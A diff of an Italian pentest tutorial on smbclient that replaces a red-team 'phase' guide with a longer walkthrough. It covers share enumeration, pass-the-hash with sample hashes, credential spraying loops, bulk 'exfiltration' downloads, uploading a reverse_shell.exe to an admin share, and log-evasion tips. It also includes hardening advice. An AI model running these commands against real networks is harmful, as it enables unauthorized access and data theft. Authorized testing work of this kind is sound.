@@ -1,9 +1,7 @@
 ---
 title: 'Smbclient: Accesso e Attacco Alle Condivisioni Windows'
 slug: smbclient
-description: >-
-  Con smbclient puoi accedere, leggere e scrivere file su condivisioni SMB.
-  Scopri come usarlo per attacchi interni, enumeration e pivoting in AD.
+description: 'Con smbclient puoi accedere, leggere e scrivere file su condivisioni SMB. Scopri come usarlo per attacchi interni, enumeration e pivoting in AD.'
 image: /smbcliehnt.webp
 draft: false
 date: 2026-01-24T00:00:00.000Z
@@ -18,225 +16,819 @@ tags:
 
 # Smbclient: Accesso e Attacco Alle Condivisioni Windows
 
-**Durante un internal assessment, la command-line enumeration con smbclient (client SMB da riga di comando) rivela una share `\\FILESRV01\Deploy$` accessibile con un service account compromesso. L'exploitation tramite smbclient porta alla scoperta di password hardcoded in script di configurazione, abilitando privilege escalation e movimento laterale tramite riutilizzo credenziali.**
+Smbclient è un client a riga di comando per il protocollo SMB/CIFS che permette l'interazione con condivisioni Windows da sistemi Linux e Unix. Sviluppato come componente della suite Samba, questo strumento offre un'interfaccia simile a FTP per accedere a risorse di rete Microsoft, trasferire file ed enumerare servizi esposti su host Windows.
 
-## TL;DR Operativo (Flusso a Step)
+Nel contesto del penetration testing, smbclient rappresenta uno degli strumenti fondamentali per la fase di reconnaissance e lateral movement in ambienti Active Directory. La sua capacità di testare configurazioni di sicurezza, enumerare share accessibili e stabilire connessioni autenticate o anonime lo rende essenziale per ogni security professional.
 
-1. Enumerazione: Usa `smbclient -L` con opzioni avanzate (`-m SMB3`, `-N`) per identificare share esposte.
-2. Autenticazione: Connettiti alle share con credenziali (`-U 'DOMAIN\user'`), hash NTLM (`--pw-nt-hash`) o ticket Kerberos (`-k`).
-3. Ricognizione Mirata: Nella shell interattiva `smb:\>` esegui `ls`, `cd`; per enumerazione profonda usa `recurse ON`.
-4. Loot Mirato: Scarica file critici con `mget *.config *.xml *.ps1` in modalità non-interattiva (`-c 'prompt OFF'`).
-5. Analisi e Riutilizzo: Estrai credenziali dai file e testane il riutilizzo su altre share con `smbclient -L //nuovo_target`.
-6. Movimento Laterale: Riutilizza credenziali valide con `smbclient -L //target` per enumerare nuove share e accedere a sistemi aggiuntivi.
-7. Post-Compromise: Sfrutta accesso a share amministrative per raccolta di file sensibili e persistenza.
+## Cos'è Smbclient e Perché è Cruciale
 
-## SMBCLIENT Advanced Usage in Red Team Context
+Smbclient implementa un client completo per il protocollo Server Message Block, lo standard utilizzato da Windows per la condivisione di file, stampanti e altre risorse di rete. A differenza di strumenti puramente enumerativi, smbclient permette interazione completa con i servizi SMB.
 
-**Comandi avanzati, gestione protocolli, autenticazione alternativa e tecniche di automazione.**
+**Capacità distintive:**
 
-**Forzatura Protocollo SMB2/3 e Negoziazione NTLMv2:**
+* Enumerazione completa delle condivisioni di rete
+* Connessione autenticata e anonima (null session)
+* Trasferimento bidirezionale di file e directory
+* Esecuzione di comandi remoti su share amministrative
+* Creazione di archivi tar per backup massicci
+* Supporto per autenticazione Kerberos e NTLM
+* Modalità interattiva e non-interattiva per scripting
+
+L'approccio "FTP-like" rende smbclient intuitivo per chiunque abbia familiarità con client di trasferimento file tradizionali, riducendo la curva di apprendimento.
+
+## Architettura Protocollo SMB/CIFS
+
+### Evoluzione Protocollo
+
+Il protocollo SMB ha subito diverse revisioni nel corso degli anni:
+
+| Versione    | Sistema Operativo  | Caratteristiche        | Sicurezza              |
+| ----------- | ------------------ | ---------------------- | ---------------------- |
+| SMB1 (CIFS) | Windows 2000/XP    | Legacy, molti dialetti | Vulnerabile, deprecato |
+| SMB2        | Windows Vista/2008 | Performance migliorate | Signing opzionale      |
+| SMB2.1      | Windows 7/2008 R2  | Oplocks migliorati     | Encryption supportata  |
+| SMB3        | Windows 8/2012+    | Encryption end-to-end  | Mandatory signing      |
+
+Smbclient supporta tutti i dialetti SMB, permettendo comunicazione con sistemi legacy e moderni. Questa compatibilità è cruciale durante assessment su reti eterogenee.
+
+### Porte e Servizi
+
+SMB opera principalmente su queste porte:
+
+```
+TCP 445 - SMB diretto (Direct Host)
+TCP 139 - SMB su NetBIOS
+UDP 137 - NetBIOS Name Service
+UDP 138 - NetBIOS Datagram Service
+```
+
+La porta 445 è il target primario per connessioni moderne, mentre la 139 è utilizzata per retrocompatibilità con sistemi più datati.
+
+## Installazione e Verifica Disponibilità
+
+### Check Presenza Sistema
+
+Prima di installare, verifica se smbclient è già disponibile:
 
 ```bash
-smbclient -L //10.10.10.10 -U 'CORP\svc_backup' --option='client min protocol=SMB2'
+which smbclient
+smbclient --version
 ```
 
-In ambienti enterprise hardened, SMB1 e NTLMv1 sono spesso disabilitati. Forzare il protocollo minimo a SMB2 garantisce una negoziazione corretta con NTLMv2.
+### Installazione su Distribuzioni Linux
 
-**Autenticazione con Hash NTLM (Pass-the-Hash):**
+**Debian/Ubuntu/Kali:**
 
 ```bash
-smbclient //10.10.10.10/Share -U 'CORP\Administrator' --pw-nt-hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+sudo apt update
+sudo apt install smbclient
 ```
 
-In scenari di post-compromise, quando si possiede l'hash NTLM, è possibile autenticarsi senza password in chiaro, abilitando scenari di pass-the-hash.
-
-**Autenticazione Kerberos (Post-Compromise AD):**
+**RHEL/CentOS/Fedora:**
 
 ```bash
-kinit svc_backup@CORP.LOCAL
-smbclient -L //filesrv01.corp.local -k
+sudo yum install samba-client
 ```
 
-Con un ticket TGT già ottenuto (es. tramite credential dumping), `-k` usa Kerberos per l'autenticazione. Riduce l'esposizione di password in rete ed è meno sospetto in ambienti AD monitorati.
-
-**Null Session per Enumerazione Iniziale:**
+**Arch Linux:**
 
 ```bash
-smbclient -L //10.10.10.10 -N
+sudo pacman -S smbclient
 ```
 
-Tenta una connessione senza credenziali. Se restituisce share, indica una grave misconfigurazione.
+La maggior parte delle distribuzioni orientate al penetration testing (Kali, Parrot, BlackArch) includono smbclient preinstallato.
 
-## Fase 1 – Ricognizione & Enumeration
+### Verifica Installazione
 
-**Enumerazione mirata delle share SMB utilizzando esclusivamente smbclient.**
-
-**Enumerazione Base delle Share:**
+Dopo l'installazione, conferma la disponibilità:
 
 ```bash
-smbclient -L //10.10.10.10 -U 'CORP\svc_backup' -m SMB3
+smbclient -h
 ```
 
-Identifica tutte le share (`Disk`) disponibili per l'utente autenticato.
+L'output mostrerà tutte le opzioni disponibili e la sintassi corretta.
 
-**Enumerazione Profonda: `ls` vs `recurse ON; ls`:**
+## Sintassi Fondamentale e Opzioni Critiche
+
+### Struttura Comando Base
 
 ```bash
-# Enumerazione superficiale (singola directory)
-smbclient //10.10.10.10/Data -U 'CORP\svc_backup' -c 'ls'
+smbclient //HOST/SHARE [opzioni]
 ```
+
+**Nota importante sullo slash:** La shell Unix interpreta il backslash come escape character. Esistono tre modalità per specificare percorsi Windows:
 
 ```bash
-# Enumerazione ricorsiva (tutte le sottodirectory)
-smbclient //10.10.10.10/Data -U 'CORP\svc_backup' -c 'recurse ON; ls'
+# Metodo 1: Doppio backslash
+smbclient \\\\192.168.1.100\\C$
+
+# Metodo 2: Quote singole
+smbclient '\\192.168.1.100\C$'
+
+# Metodo 3: Forward slash (funziona sempre)
+smbclient //192.168.1.100/C$
 ```
 
-* **Differenza Operativa:** Il primo comando genera un singolo Event ID 5145 per la directory root. Il secondo genera un evento 5145 per *ogni* directory e file enumerato, aumentando drasticamente il rumore nei log e il rischio di detection.
+Il terzo metodo (forward slash) è raccomandato per semplicità e compatibilità.
 
-**Enumerazione con Credenziali Multiple (One-Liner):**
+### Parametri Operativi Essenziali
 
 ```bash
-for user in $(cat users.txt); do smbclient -L //10.10.10.10 -U "CORP\\$user%Welcome123" -m SMB3 2>/dev/null | grep -q "Disk" && echo "[+] $user has access"; done
+-L [HOST]         # Lista tutte le condivisioni disponibili
+-U [username]     # Specifica username per autenticazione
+-N                # Null session (no password)
+-W [workgroup]    # Specifica workgroup o dominio
+-I [IP]           # Connessione diretta a IP specifico
+-p [porta]        # Porta personalizzata (default 445)
+-c 'comando'      # Esegue comando singolo non-interattivo
+-d [0-10]         # Debug level (verbose output)
+-k                # Usa autenticazione Kerberos
+-m [protocol]     # Specifica versione protocollo SMB
 ```
 
-Testa rapidamente una lista di utenti con una password comune per identificare accessi validi.
-
-## Fase 2 – Initial Exploitation
-
-**Accesso alle share e valutazione dei permessi di lettura/scrittura tramite comandi interattivi di smbclient.**
-
-**Accesso Interattivo e Comandi Base:**
+### Opzioni Autenticazione Avanzate
 
 ```bash
-smbclient //10.10.10.10/Data -U 'CORP\svc_backup'
+--pw-nt-hash      # Autentica con hash NTLM (pass-the-hash)
+--password-file   # Legge password da file
+--client-protection=off  # Disabilita encryption SMB3
 ```
 
-Nella shell `smb:\>` usa:
+## Enumerazione Share e Reconnaissance
+
+### Listing Share Anonimo
+
+La prima fase di qualsiasi assessment SMB è l'enumerazione delle condivisioni disponibili:
+
+```bash
+smbclient -L //192.168.1.100 -N
+```
+
+Questo comando tenta un null session per listare tutte le share esposte senza autenticazione.
+
+**Output tipico:**
 
 ```
-smb: \> ls
-smb: \> cd Finance
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+Users           Disk      User home directories
+```
+
+### Enumerazione Autenticata
+
+Con credenziali valide, ottieni visibilità su share aggiuntive:
+
+```bash
+smbclient -L //192.168.1.100 -U amministratore
+```
+
+Dopo aver inserito la password, vedrai tutte le condivisioni accessibili con quel livello di privilegio.
+
+### Identificazione Share Amministrative
+
+Le share con sufisso `$` sono condivisioni amministrative nascoste:
+
+* **ADMIN$** - Directory Windows/System32
+* **C$, D$** - Root delle partizioni
+* **IPC$** - Inter-Process Communication (null session tradizionale)
+
+L'accesso a queste richiede privilegi amministrativi sul target.
+
+Scopri cos'è [SMB](https://hackita.it/articoli/smb) e come testarne la sicurezza nella nostra guida approfondita.
+
+## Modalità Connessione e Interazione
+
+### Connessione Interattiva Base
+
+Stabilisci una sessione FTP-like con una share:
+
+```bash
+smbclient //192.168.1.100/Users -U john
+```
+
+Una volta connesso, ricevi un prompt `smb: \>` dove puoi eseguire comandi interattivi.
+
+**Comandi disponibili nel prompt interattivo:**
+
+```
+ls                # Lista contenuti directory corrente
+cd [directory]    # Cambia directory
+lcd [path]        # Cambia directory locale (client)
+get [file]        # Scarica file
+put [file]        # Carica file
+mget [pattern]    # Scarica multipli file
+mput [pattern]    # Carica multipli file
+mkdir [nome]      # Crea directory
+rmdir [nome]      # Rimuovi directory
+del [file]        # Elimina file
+prompt            # Toggle prompt per operazioni multiple
+recurse           # Toggle ricorsione per mget/mput
+help              # Mostra tutti i comandi disponibili
+exit              # Chiudi sessione
+```
+
+### Esecuzione Comandi Non-Interattivi
+
+Per scripting e automazione, usa il flag `-c`:
+
+```bash
+smbclient //192.168.1.100/Documents -U admin -c 'ls'
+```
+
+Questo esegue il comando `ls` e termina immediatamente, ideale per pipeline e script bash.
+
+### Null Session Testing
+
+Le null session permettono connessioni anonime a share mal configurate:
+
+```bash
+smbclient //192.168.1.100/IPC$ -N
+```
+
+Se la connessione ha successo, il sistema è vulnerabile a enumerazione anonima. Questa tecnica è particolarmente efficace su sistemi Windows legacy (2000/XP/2003).
+
+## Trasferimento File e Gestione Dati
+
+### Download Singolo File
+
+Dalla modalità interattiva:
+
+```bash
+smb: \> get confidential.docx
+```
+
+Oppure in modalità non-interattiva:
+
+```bash
+smbclient //192.168.1.100/Documents -U admin -c 'get report.pdf'
+```
+
+Il file viene scaricato nella directory di lavoro corrente del client.
+
+### Upload File su Share Remote
+
+Carica un file locale sulla condivisione:
+
+```bash
+smb: \> put /tmp/payload.exe
+```
+
+Versione non-interattiva:
+
+```bash
+smbclient //192.168.1.100/Public -U guest -c 'put exploit.sh'
+```
+
+### Download Ricorsivo Completo
+
+Per scaricare intere directory structure:
+
+```bash
 smb: \> recurse ON
 smb: \> prompt OFF
-smb: \> get report.pdf
-smb: \> put canary.txt
+smb: \> mget *
 ```
 
-**Test Permessi Scrittura in Modalità One-Liner:**
+Questo scarica ricorsivamente tutti i file e sottodirectory mantenendo la struttura originale.
+
+**Versione one-liner:**
 
 ```bash
-echo "PENTEST_CANARY" > test.txt && smbclient //10.10.10.10/Public -U 'CORP\svc_backup' -c 'put test.txt; del test.txt' 2>&1 | grep -v "failed"
+smbclient //target/share -U user -c 'recurse;prompt;mget *'
 ```
 
-Verifica rapidamente i permessi di scrittura e pulisci le tracce.
+### Gestione Directory Remote
 
-## Fase 3 – Post-Compromise & Privilege Escalation
-
-**Analisi dei file estratti e ricerca di credenziali riutilizzabili per l'escalation.**
-
-**Loot Mirato di File di Configurazione:**
+Crea nuove directory:
 
 ```bash
-smbclient //10.10.10.10/Deploy$ -U 'CORP\svc_backup' -c 'recurse ON; prompt OFF; mget *.config *.ini *.xml *.env 2>/dev/null'
+smb: \> mkdir backup_2024
 ```
 
-**Estrazione di Credenziali dai File:**
+Naviga tra directory:
 
 ```bash
-grep -r -i -E "password|pwd=|connectionString|token=|key=" ./loot/ --include="*.{config,xml,ini}" 2>/dev/null
+smb: \> cd Projects/Active
+smb: \Projects\Active\> ls
 ```
 
-**Ricerca di Chiavi SSH e Certificati:**
+Elimina file e directory:
 
 ```bash
-find ./loot/ -type f \( -name "id_rsa" -o -name "*.pem" -o -name "*.pfx" \) 2>/dev/null
+smb: \> del obsolete.txt
+smb: \> rmdir old_folder
 ```
 
-## Fase 4 – Lateral Movement & Pivoting
+## Tecniche di Autenticazione Avanzate
 
-**Riutilizzo delle credenziali compromesse per accedere a nuove share e sistemi tramite smbclient.**
+### Autenticazione Standard NTLM
 
-**Password Replay con Smbclient:**
+Modalità più comune con username e password:
 
 ```bash
-for ip in $(cat targets.txt); do smbclient -L //$ip -U 'CORP\svc_backup%Password123!' -m SMB3 2>/dev/null | grep -q "Disk" && echo "[+] Share found on $ip"; done
+smbclient //192.168.1.100/C$ -U DOMAIN/administrator
 ```
 
-**Accesso a Share Amministrative con Hash NTLM:**
+Il sistema chiederà la password interattivamente. Per evitare il prompt:
 
 ```bash
-smbclient //10.10.10.20/C$ -U 'CORP\Administrator' --pw-nt-hash <NTLM_HASH> -c 'ls'
+smbclient //192.168.1.100/C$ -U administrator%P@ssw0rd123
 ```
 
-Utilizza l'hash NTLM ottenuto in fase di post-compromise per tentare l'accesso a share privilegiate.
+**Attenzione:** Questo metodo espone la password nella command line history.
 
-## Fase 5 – Detection & Hardening
+Per capire come funziona **[NTLM](https://hackita.it/articoli/ntlm)** il protocollo di autenticazione di Windows dietro SMB, e come sfruttarne le vulnerabilità, leggi la nostra guida completa:
 
-**Indicatori di Compromissione specifici per l'uso di smbclient e mitigazioni.**
+### Autenticazione con File Credenziali
 
-**Detection Specifica:**
+Metodo più sicuro per scripting:
 
-* **Event ID 5145 (Detailed File Share)**: Picchi di operazioni `Read` su file `.config`, `.xml`, `.ps1` dallo stesso utente in \<60 secondi.
-* **Event ID 4663 (Object Access)**: Pattern anomali di `SMB2 CREATE` seguito immediatamente da `SMB2 WRITE` (upload file sospetti).
-* **Event ID 4624 (Logon Type 3)**: Logon di rete da source IP insoliti correlati ad accessi a share.
-* **SMB2 WRITE Pattern**: Elevato numero di operazioni di open/write/close in breve tempo su share non destinate al file sharing utente.
+```bash
+echo "password_sicura" > /tmp/creds.txt
+chmod 600 /tmp/creds.txt
+smbclient //192.168.1.100/Share -U admin --password-file=/tmp/creds.txt
+```
 
-**OPSEC per SMBCLIENT:**
+### Pass-the-Hash Attack
 
-* **Autenticazione**: Preferire l'input interattivo della password o l'uso di ticket Kerberos (`-k`) all'inline `%password`.
-* **Enumerazione Profonda**: Usare `recurse ON` solo quando necessario, poiché genera un volume di log elevato.
-* **Timing**: Dilazionare le operazioni di loot per evitare spike di eventi 5145/4663.
-* **Loot Mirato**: Preferire `mget *.ext` a `mget *` per ridurre il numero di file trasferiti e gli eventi generati.
+Se hai ottenuto un hash NTLM durante l'assessment:
 
-**Hardening Concreto:**
+```bash
+smbclient //192.168.1.100/C$ -U administrator --pw-nt-hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+```
 
-* **Principio del Privilegio Minimo**: Gli account di servizio devono avere accesso solo alle share necessarie, con permessi di sola lettura.
-* **Abilitare e Forzare SMB Signing**: Previene attacchi di relay.
-* **Auditing Avanzato**: Abilitare auditing dettagliato (Success/Failure) sulle share critiche. Monitorare le soglie per operazioni `Read/Write` anomale.
-* **Disabilitare SMBv1 e NTLMv1**: Forzare l'uso di SMB2/3 e NTLMv2.
-* **Segmentazione di Rete**: Isolare i file server e limitare le connessioni SMB (445/tcp) tramite firewall interno.
+Questa tecnica bypassa la necessità della password in chiaro, utilizzando direttamente l'hash per l'autenticazione.
 
-## Errori Comuni Che Vedo Negli Assessment Reali
+### Autenticazione Kerberos
 
-* **Non forzare SMB2/3**: Causa errori di negoziazione in ambienti dove SMB1 è disabilitato.
-* **Ignorare l'autenticazione Kerberos (`-k`)**: Non sfruttare ticket TGT disponibili, perdendo un'opzione più stealth.
-* **Uso indiscriminato di `recurse ON`**: Genera un volume esplosivo di log 5145, aumentando esponenzialmente il rischio di detection.
-* **Errata interpretazione errori**: Confondere `NT_STATUS_ACCESS_DENIED` (permessi) con `NT_STATUS_BAD_NETWORK_NAME` (share inesistente).
-* **OPSEC povero**: Lasciare password in chiaro nella history dei comandi o eseguire operazioni massive in orari lavorativi.
+In ambienti Active Directory configurati correttamente:
 
-## Mini Tabella 80/20 Finale
+```bash
+# Prima ottieni un ticket Kerberos
+kinit administrator@DOMAIN.LOCAL
 
-| Obiettivo                   | Azione                           | Comando SMBCLIENT                                                                     |
-| :-------------------------- | :------------------------------- | :------------------------------------------------------------------------------------ |
-| **Enumerare Share**         | Listare share disponibili        | `smbclient -L //TARGET -U 'DOMAIN\user' -m SMB3`                                      |
-| **Autenticazione Hash**     | Uso NTLM hash per autenticazione | `smbclient //TARGET/Share -U user --pw-nt-hash <HASH>`                                |
-| **Autenticazione Kerberos** | Usare ticket TGT                 | `kinit user; smbclient -L //target -k`                                                |
-| **Loot Automatico**         | Scaricare file di configurazione | `smbclient //TARGET/Share -U 'user' -c 'recurse ON; prompt OFF; mget *.config *.xml'` |
-| **Test Scrittura**          | Verificare permessi di upload    | `smbclient //TARGET/Share -U 'user' -c 'put test.txt'`                                |
+# Poi connetti usando il ticket
+smbclient //server.domain.local/share -k
+```
 
-**Perfeziona l'uso avanzato di smbclient, inclusa l'autenticazione via hash NTLM e Kerberos, in uno scenario di lab realistico multi-step che replica un ambiente enterprise con auditing avanzato e SMB signing abilitato.**
+L'opzione `-k` indica a smbclient di utilizzare il ticket Kerberos invece di NTLM.
 
-## 🔗 Link Interni HackITA
+Per approfondire **[Kerberos](https://hackita.it/articoli/kerberos)** il principale protocollo di autenticazione negli ambienti Active Directory, leggi la guida completa:
 
-Approfondisci le tecniche correlate:
+### Specifica Dominio Windows
 
-* [https://hackita.it/articoli/smb](https://hackita.it/articoli/smb)
-* [https://hackita.it/articoli/kerberos](https://hackita.it/articoli/kerberos)
-* [https://hackita.it/articoli/pass-the-hash](https://hackita.it/articoli/pass-the-hash)
-* [https://hackita.it/articoli/pivoting](https://hackita.it/articoli/pivoting)
+Per reti con Active Directory:
 
-Per servizi Red Team e simulazioni realistiche in ambienti enterprise:
+```bash
+smbclient //192.168.1.100/Share -U CORP/john.doe
+```
 
-* [https://hackita.it/servizi](https://hackita.it/servizi)
+Oppure usando il formato UPN:
 
-Per supportare il progetto:
+```bash
+smbclient //192.168.1.100/Share -U john.doe@corp.local
+```
 
-* [https://hackita.it/supporta](https://hackita.it/supporta)
+## Operazioni Avanzate: Tar Backup e Restore
+
+### Creazione Backup Tar
+
+Smbclient include funzionalità native per creare archivi tar di condivisioni remote:
+
+```bash
+smbclient //192.168.1.100/Documents -U admin -Tc backup_docs.tar '*'
+```
+
+Il flag `-Tc` significa:
+
+* `-T` = modalità tar
+* `c` = create (crea archivio)
+
+**Backup directory specifica:**
+
+```bash
+smbclient //192.168.1.100/C$ -U admin -Tc backup.tar 'Users/john/Desktop/*'
+```
+
+### Restore da Archivio Tar
+
+Per ripristinare file da un backup tar:
+
+```bash
+smbclient //192.168.1.100/Restore -U admin -Tx backup_docs.tar
+```
+
+Il flag `-Tx` significa:
+
+* `-T` = modalità tar
+* `x` = extract (estrai archivio)
+
+**Restore selettivo:**
+
+```bash
+smbclient //192.168.1.100/C$ -U admin -Tx backup.tar './Documents/important.xlsx'
+```
+
+Questo ripristina solo il file specifico dall'archivio.
+
+### Uso in Modalità Interattiva
+
+Attiva la modalità tar durante una sessione:
+
+```bash
+smb: \> tarmode
+smb: \> recurse
+smb: \> prompt OFF
+smb: \> mget Projects/
+```
+
+Questo scarica l'intera directory Projects come archivio tar.
+
+## Mounting Persistente con Smbmount
+
+### Montaggio Manuale Share
+
+Per accesso persistente a una condivisione Windows:
+
+```bash
+smbmount //192.168.1.100/Documents /mnt/windows_docs -o username=john
+```
+
+Dopo aver inserito la password, la share sarà accessibile come normale directory locale in `/mnt/windows_docs`.
+
+### Alternativa con Mount Standard
+
+Sintassi equivalente usando il comando `mount` nativo:
+
+```bash
+mount -t cifs //192.168.1.100/Documents /mnt/windows_docs -o username=john,password=secret
+```
+
+### Opzioni Avanzate Mount
+
+```bash
+mount -t cifs //192.168.1.100/Share /mnt/share -o username=admin,domain=CORP,uid=1000,gid=1000,file_mode=0755,dir_mode=0755
+```
+
+Parametri importanti:
+
+* `uid/gid` - Ownership dei file montati
+* `file_mode/dir_mode` - Permessi Unix per file e directory
+* `domain` - Dominio Windows per autenticazione
+* `vers=3.0` - Forza versione protocollo SMB
+
+### Configurazione Persistente in /etc/fstab
+
+Per mounting automatico al boot:
+
+```bash
+echo "//192.168.1.100/Share /mnt/share cifs username=user,password=pass,uid=1000 0 0" >> /etc/fstab
+```
+
+**Versione sicura con file credenziali:**
+
+```bash
+# Crea file credenziali
+echo "username=john" > /root/.smbcredentials
+echo "password=secret" >> /root/.smbcredentials
+echo "domain=CORP" >> /root/.smbcredentials
+chmod 600 /root/.smbcredentials
+
+# Aggiungi a fstab
+echo "//192.168.1.100/Share /mnt/share cifs credentials=/root/.smbcredentials,uid=1000 0 0" >> /etc/fstab
+```
+
+### Unmount Condivisione
+
+```bash
+umount /mnt/windows_docs
+# oppure
+smbumount /mnt/windows_docs
+```
+
+## Scenari Operativi Penetration Testing
+
+### Scenario 1: Enumerazione Iniziale Post-Discovery
+
+Dopo aver identificato host Windows con Nmap:
+
+```bash
+# Verifica porte SMB aperte
+nmap -p445,139 192.168.1.0/24 --open
+
+# Enumera share per ogni host trovato
+for ip in $(cat smb_hosts.txt); do
+    echo "[*] Enumerating $ip"
+    smbclient -L //$ip -N 2>/dev/null
+done
+```
+
+### Scenario 2: Null Session Exploitation
+
+Testa vulnerabilità null session su range IP:
+
+```bash
+#!/bin/bash
+for ip in 192.168.1.{1..254}; do
+    smbclient -L //$ip -N 2>&1 | grep -v "Connection\|failed" && echo "[+] Null session: $ip"
+done
+```
+
+### Scenario 3: Credential Spraying
+
+Test credenziali comuni su share:
+
+```bash
+#!/bin/bash
+USERS="admin administrator guest"
+SHARES="C$ ADMIN$ IPC$"
+PASSWORD="Password123"
+
+for user in $USERS; do
+    for share in $SHARES; do
+        echo "[*] Testing $user on //$TARGET/$share"
+        smbclient //$TARGET/$share -U $user%$PASSWORD -c 'ls' 2>&1 | grep -q "smb:" && echo "[+] Success: $user:$PASSWORD"
+    done
+done
+```
+
+### Scenario 4: Data Exfiltration
+
+Esfiltrazione massiva di documenti sensibili:
+
+```bash
+# Connetti e scarica ricorsivamente tutti i documenti
+smbclient //target/FileServer -U compromised_user -c 'recurse;prompt;mget *.docx *.xlsx *.pdf'
+
+# Crea backup tar completo
+smbclient //target/Confidential -U admin -Tc exfil_$(date +%F).tar '*'
+```
+
+### Scenario 5: Lateral Movement con Share Amministrative
+
+Dopo aver compromesso credenziali admin:
+
+```bash
+# Accedi a C$ della vittima
+smbclient //victim_pc/C$ -U DOMAIN/administrator
+
+# Carica payload
+smb: \> cd Windows\Temp
+smb: \Windows\Temp\> put reverse_shell.exe
+smb: \Windows\Temp\> exit
+
+# Esegui con psexec o altro metodo
+```
+
+## Troubleshooting e Edge Cases
+
+### Problema: Connection Timeout
+
+**Sintomo:**
+
+```
+Connection to 192.168.1.100 failed (Error NT_STATUS_IO_TIMEOUT)
+```
+
+**Soluzioni:**
+
+```bash
+# Verifica connettività di base
+ping 192.168.1.100
+telnet 192.168.1.100 445
+
+# Verifica firewall locale
+sudo iptables -L -n | grep 445
+
+# Testa porta alternativa (139)
+smbclient -L //192.168.1.100 -p 139 -N
+```
+
+### Problema: Access Denied
+
+**Sintomo:**
+
+```
+tree connect failed: NT_STATUS_ACCESS_DENIED
+```
+
+**Cause comuni:**
+
+* Credenziali errate
+* Share richiede permessi specifici
+* Account lockout policy attiva
+* Firewall Windows blocca connessione
+
+**Verifica:**
+
+```bash
+# Test credenziali su share differente
+smbclient -L //target -U username
+
+# Verifica account lockout
+rpcclient -U username target -c 'getusrdompwinfo'
+```
+
+### Problema: Protocol Negotiation Failed
+
+**Sintomo:**
+
+```
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+```
+
+**Causa:** Mismatch versione protocollo SMB.
+
+**Soluzione:**
+
+```bash
+# Forza SMB1 (sistemi legacy)
+smbclient //target/share -U user --option='client min protocol=NT1'
+
+# Forza SMB2
+smbclient //target/share -U user -m SMB2
+
+# Forza SMB3
+smbclient //target/share -U user -m SMB3
+```
+
+### Problema: Character Encoding Issues
+
+Per sistemi con encoding non-UTF8:
+
+```bash
+# Specifica codepage
+smbclient //target/share -U user --option='dos charset=CP850'
+```
+
+### Problema: Large File Transfer Failures
+
+Per file molto grandi:
+
+```bash
+# Incrementa buffer size
+smbclient //target/share -U user --option='client max protocol=SMB3' --option='client ipc max protocol=SMB3'
+```
+
+### Debugging Avanzato
+
+Attiva logging dettagliato:
+
+```bash
+# Debug level 3 (raccomandato)
+smbclient //target/share -U user -d 3
+
+# Debug level 10 (verboso completo)
+smbclient //target/share -U user -d 10 2>&1 | tee debug.log
+```
+
+## Utilizzo Tool Correlati: Nmblookup
+
+### Identificazione NetBIOS Names
+
+Nmblookup permette risoluzione nomi NetBIOS:
+
+```bash
+nmblookup -A 192.168.1.100
+```
+
+**Output tipico:**
+
+```
+Looking up status of 192.168.1.100
+    FILESERVER      <00> -         B <ACTIVE> 
+    WORKGROUP       <00> - <GROUP> B <ACTIVE> 
+    FILESERVER      <20> -         B <ACTIVE> 
+    WORKGROUP       <1e> - <GROUP> B <ACTIVE> 
+    ADMINISTRATOR   <03> -         B <ACTIVE>
+```
+
+**Interpretazione codici:**
+
+* `<00>` - Workstation Service
+* `<03>` - Messenger Service (utente loggato)
+* `<20>` - File Server Service
+* `<1e>` - Browser Service Elections
+
+### Identificazione Master Browser
+
+```bash
+nmblookup -M -- -
+```
+
+Questo identifica quali host sono master browser sulla rete locale.
+
+### Risoluzione Nome NetBIOS
+
+```bash
+nmblookup FILESERVER
+```
+
+Restituisce l'IP associato al nome NetBIOS specificato.
+
+## Tabella Operativa Comandi Essenziali
+
+| Obiettivo                  | Comando                                                       | Autenticazione  | Output Atteso                 |
+| -------------------------- | ------------------------------------------------------------- | --------------- | ----------------------------- |
+| Enumerazione share anonima | `smbclient -L //target -N`                                    | Null session    | Lista share pubbliche         |
+| Enumerazione autenticata   | `smbclient -L //target -U user`                               | Credenziali     | Lista completa share          |
+| Connessione interattiva    | `smbclient //target/share -U user`                            | Credenziali     | Prompt `smb: \>`              |
+| Download singolo file      | `smbclient //target/share -U user -c 'get file.txt'`          | Credenziali     | File scaricato localmente     |
+| Upload file                | `smbclient //target/share -U user -c 'put local.exe'`         | Credenziali     | File caricato su share        |
+| Download ricorsivo         | `smbclient //target/share -U user -c 'recurse;prompt;mget *'` | Credenziali     | Directory completa scaricata  |
+| Backup tar remoto          | `smbclient //target/share -U user -Tc backup.tar '*'`         | Credenziali     | Archivio tar creato           |
+| Restore tar                | `smbclient //target/share -U user -Tx backup.tar`             | Credenziali     | File estratti su share        |
+| Pass-the-hash              | `smbclient //target/C$ -U admin --pw-nt-hash [hash]`          | Hash NTLM       | Accesso con hash              |
+| Kerberos auth              | `smbclient //target/share -k`                                 | Ticket Kerberos | Autenticazione trasparente    |
+| Mount persistente          | `mount -t cifs //target/share /mnt -o user=admin`             | Credenziali     | Share montata come filesystem |
+| Lista directory            | `smbclient //target/share -U user -c 'ls'`                    | Credenziali     | Contenuto directory           |
+| Crea directory             | `smbclient //target/share -U user -c 'mkdir folder'`          | Credenziali     | Directory creata              |
+| Elimina file               | `smbclient //target/share -U user -c 'del file.txt'`          | Credenziali     | File eliminato                |
+| Test null session IPC$     | `smbclient //target/IPC$ -N`                                  | Null session    | Connessione riuscita/fallita  |
+
+## Checklist Operativa Pre-Assessment
+
+Prima di utilizzare smbclient in un penetration test:
+
+* Verifica autorizzazione scritta per il testing
+* Documenta scope e target IP/hostname
+* Verifica connettività di rete (ping, traceroute)
+* Testa porte SMB aperte (445, 139)
+* Enumera share con null session prima
+* Prepara wordlist credenziali se richiesto
+* Configura logging per tutte le attività
+* Testa credenziali su share non-critiche prima
+* Verifica spazio disco disponibile per exfiltration
+* Prepara metodi alternativi (rpcclient, enum4linux)
+* Documenta ogni tentativo di accesso
+* Configura timeout appropriati per evitare detection
+* Valuta impatto di operazioni massive (mget)
+* Prepara piano di cleanup post-assessment
+* Verifica requisiti per pass-the-hash se necessario
+
+## FAQ Tecniche Smbclient
+
+**Qual è la differenza tra smbclient e altri tool SMB come enum4linux?**
